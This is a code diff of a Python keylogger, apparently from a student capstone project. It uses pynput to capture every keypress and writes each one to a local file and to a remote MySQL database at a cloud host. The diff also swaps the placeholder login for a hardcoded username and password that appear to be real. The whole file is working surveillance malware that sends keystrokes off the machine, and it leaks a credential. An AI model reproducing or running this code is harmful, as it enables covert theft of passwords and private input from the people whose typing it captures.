@@ -1,25 +1,16 @@
 import mysql.connector
-import pynput
+from pynput.keyboard import Key, Listener
 
-
-from pynput.keyboard import Key,Listener
-
-count = 0
-keys = []
-
-
-# Function to establish a connection to the MySQL database
 def connect_to_database():
     try:
         conn = mysql.connector.connect(
-            host='localhost',
-            user='your_username',
-            password='your_password',
-            database='your_database'
+            host='aws.connect.psdb.cloud',
+            user='79u9r9663s85vutevk0d',
+            password='pscale_pw_ksUEzXbwUQOhTLEXhTN3X2hXM5ZSqEUmHzV0K9DFLYZ',
+            database='projectcapstonecybersuite'
         )
         cursor = conn.cursor()
 
-        # Create a table to store key presses
         cursor.execute('''
             CREATE TABLE IF NOT EXISTS key_log (
                 id INT AUTO_INCREMENT PRIMARY KEY,
@@ -34,60 +25,43 @@ def connect_to_database():
         print(f"Error connecting to MySQL: {e}")
         return None, None
 
-# Function to write key presses to the database
-def write_to_database(conn, cursor, keys):
-    key_str = ""
-    for key in keys:
-        k = str(key).replace("'", "")
-        if k.find("backspace") > 0:
-            key_str += "Backspace_key "
-        elif k.find("enter") > 0:
-            key_str += '\n'
-        elif k.find("shift") > 0:
-            key_str += "Shift_key "
-        elif k.find("space") > 0:
-            key_str += " "
-        elif k.find("caps_lock") > 0:
-            key_str += "caps_Lock_key "
-        elif k.find("Key"):
-            key_str += k
-
+def write_to_database(conn, cursor, key):
     try:
-        # Insert the key presses into the database
-        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (key_str,))
+        cursor.execute('INSERT INTO key_log (key_press) VALUES (%s)', (str(key),))
         conn.commit()
     except mysql.connector.Error as e:
         print(f"Error writing to database: {e}")
 
-# Function to handle key press event
+def write_to_file(key):
+    try:
+        with open("key_log.txt", "a") as file:
+            file.write(str(key) + '\n')
+    except IOError as e:
+        print(f"Error writing to file: {e}")
+
 def on_press(key, conn, cursor):
-    global keys, count
-
-    keys.append(key)
-    count += 1
-    print("{0} pressed".format(key))
-
-    if count >= 1:
-        count = 0
-        write_to_database(conn, cursor, keys)
-        keys = []
-
-# Function to handle key release event
-def on_release(key, conn):
-    global exit
     if key == Key.esc:
-        exit += 1
-        if exit == 5:
-            # Close the database connection when the program exits
-            if conn:
-                conn.close()
-            return False
+        # Stop the listener
+        print("Keylogger execution interrupted by user.")
+        return False
+    try:
+        write_to_database(conn, cursor, key)
+        write_to_file(key)
+    except Exception as e:
+        print(f"Error processing key: {e}")
 
-exit = 0
+def on_release(key, conn):
+    pass  # You can add additional logic for key release if needed
 
-# Establish a connection to the database
-conn, cursor = connect_to_database()
+def keylogger_thread():
+    conn, cursor = connect_to_database()
 
-with Listener(on_press=lambda key: on_press(key, conn, cursor),
-              on_release=lambda key: on_release(key, conn)) as listener:
-    listener.join()
+    with Listener(on_press=lambda key: on_press(key, conn, cursor),
+                  on_release=lambda key: on_release(key, conn)) as listener:
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            print("Keylogger execution interrupted by user.")
+
+if __name__ == "__main__":
+    keylogger_thread()
